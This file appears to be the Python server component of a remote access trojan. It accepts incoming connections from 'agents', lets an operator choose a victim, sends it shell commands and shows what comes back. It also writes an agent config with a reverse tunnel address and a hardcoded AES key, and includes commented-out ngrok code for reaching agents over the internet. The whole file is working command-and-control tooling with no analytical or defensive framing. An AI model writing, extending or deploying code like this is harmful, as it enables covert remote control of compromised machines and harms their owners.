#!/usr/bin/env python3
from commons.helpers import SocketBuilder, Config
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from time import sleep
from os import system
from platform import platform
from base64 import b64decode, b64encode
from pyngrok import ngrok
from socket import error, timeout, socket

global inaddrs, inconns, connections

INCOMING_INTERVAL = 0x3000
RESTART_INTERVAL = 0x2000
PORT = 1055#0x27af
BUFFER_SIZE = 0x400
MAX_CONNS = 0x100

inaddrs = []
inconns = []
connections = (inconns, inaddrs)

_cconsole = lambda: system('clear') if not (platform().lower().startswith('win')) else system('cls')


def footer():
    print('| .. | \t............ : .....\t |  .............. |')
    print('|----|---------------------------|-----------------|')
    print('\n[*] Ctrl+C to select a target')
    print('[*] select 0 to exit')


def cconsole():
    _cconsole()
    print('\n|--------------------------------------------------|')
    print('|=============== Connected Agents =================|')
    print('|--------------------------------------------------|')
    print('| #  | \t  IP ADDRESS : PORT\t |  0x1cf4a7a6eec0 |')
    print('|----|---------------------------|-----------------|')


class Server(object):
    __sock = None
    __address: tuple = ('0.0.0.0', PORT)
    __server_up = False
    __proxy_tunnel = None

    __secret = bytes('YAHHU88il27a&4Na', 'utf-8')
    __cipher = AES.new(__secret, AES.MODE_ECB)

    EncodeAES = lambda c, s: b64encode(c.encrypt(pad(s, AES.block_size)))
    DecodeAES = lambda c, e: c.decrypt(b64decode(e)).decode()

    def __init__(self, reverse_url=None):
        if reverse_url:
            self.__proxy_tunnel = reverse_url
        else:
            ...
            # proxy = ngrok.connect(PORT, 'tcp')
        #     self.__proxy_tunnel = proxy.public_url
        # if not self.__dist_agent_ini__():
        #     self.__dist_agent_ini__()
        self.__server_up = self.__create_socket__()

    def __dist_agent_ini__(self):
        try:
            url, port = self.__proxy_tunnel.split("//").pop().split(":")
            secret = self.__secret.decode('utf-8')
            with open(f'{Config.dist()}/agent.ini', 'w') as ini:
                ini.write(f"[Settings]\nReverseUrl={url}\nReversePort={port}\nReverseKey={secret}")
                ini.close()
            return True
        except:
            return False

    def __create_socket__(self):
        try:
            self.__sock = SocketBuilder\
                .of_kind(SocketBuilder.SERVICE)\
                .point_to(self.__address)\
                .backlog(MAX_CONNS)\
                .build()
            self.__server_up = True
            print('[*] Socket was created and ready...')
            return True
        except error as e:
            return False

    def __make_connection__(self):
        global inaddrs, inconns
        try:
            self.__sock.settimeout(INCOMING_INTERVAL)
            cs, ca = self.__sock.accept()
            inconns.append(cs)
            inaddrs.append(ca)
            return True
        except error:
            return False

    def __target_exchange__(self):
        global inconns, inaddrs
        try:
            self.__refresh__(inconns, inaddrs)
            choice = int(input('[*] select agent: \n'))
            if choice == 0x0:
                print('[!] Closing All Connection ... ')
                exit(0)
            if (choice > 0) and (choice <= (len(inconns) and len(inaddrs))):
                choice = choice - 0x1
                for i, pair in enumerate(zip(range(0, len(inconns)), range(0, len(inaddrs)))):
                    cconsole()
                    pip, port = inaddrs[choice]
                    conn = inconns[choice]
                    print('| '+str(choice + 0x1)+' | \t'+str(pip)+' : '+str(port)+'\t |  '+hex(id(conn))+' |')
                    print('|----|---------------------------|-----------------|')
                    print('[*] Enter 0 to exit interaction mode')
                    print('[*] Enter ? to see available commands ')
                    stdin = input('[$] Enter command: \n')
                    if int(stdin) == 0x0:
                        return
                    if '?' in stdin:
                        input('[*] Press Enter to resume ...')
                        return
                    conn.sendall(stdin.encode())
                    data = conn.recv(BUFFER_SIZE)
                    print(data.decode())
            else:
                print('[!] choice not found!')
                sleep(0xf/0x0008)
                return False
            return True
        except:
            exit(1)

    def __refresh__(self, inconns, inaddrs):
        cconsole()
        for i in range(0, len(inconns)):
            pip, port = inaddrs[i]
            print('| %d  | \t  %s  : %d\t |  %s |' % (i + 1, pip, port, hex(id(inconns[i]))))
            print('|----|---------------------------|-----------------|')
        footer()

    def start(self):
        global inconns, inaddrs
        if not self.__sock:
            if self.__create_socket__():
                self.__server_up = True
            else:
                raise Exception("Error while starting up the server service")
        if self.__proxy_tunnel:
            ip, port = self.__address
            address = f"tcp://{ip}:{port}"
            print('[@] Waiting for connection : {} ~> {} {}'.format(
                self.__proxy_tunnel, address, hex(id(self.__sock)))
            )
        else:
            print('[@] Waiting for connection : %s:%s' % self.__address, hex(id(self.__sock)))
        while self.__server_up:
            try:
                self.__refresh__(inconns, inaddrs)
                try:
                    if not self.__make_connection__():
                        continue
                except timeout:
                    self.__refresh__(inconns, inaddrs)
                    continue
            except KeyboardInterrupt:
                try:
                    self.__target_exchange__()
                except:
                    self.__destroy_all_sessions__()
                    return

    def __destroy_all_sessions__(self):
        global inaddrs, inconns
        try:
            for i, pair in enumerate(zip(range(0x0, len(inconns)), range(0x0, len(inaddrs)))):
                ip, port = inaddrs[i]
                conn = inconns[i]
                print('[!] Closing ' + str(hex(id(conn))) + ' ~> ' + str(ip) + ':' + str(port) + ' ...')
                terminate_seq = b'4B14868924ACEE98C9C9C404A1F87B08'
                conn.sendall(terminate_seq)
                conn.close()
            print('[!] Closing %s ~> %s:%d' % (hex(id(self.__sock)), self.__address[0], self.__address[1]))
            self.__sock.close()
        except error:
            self.__sock.close()


if __name__ == '__main__':
    s = Server()
    s.start()
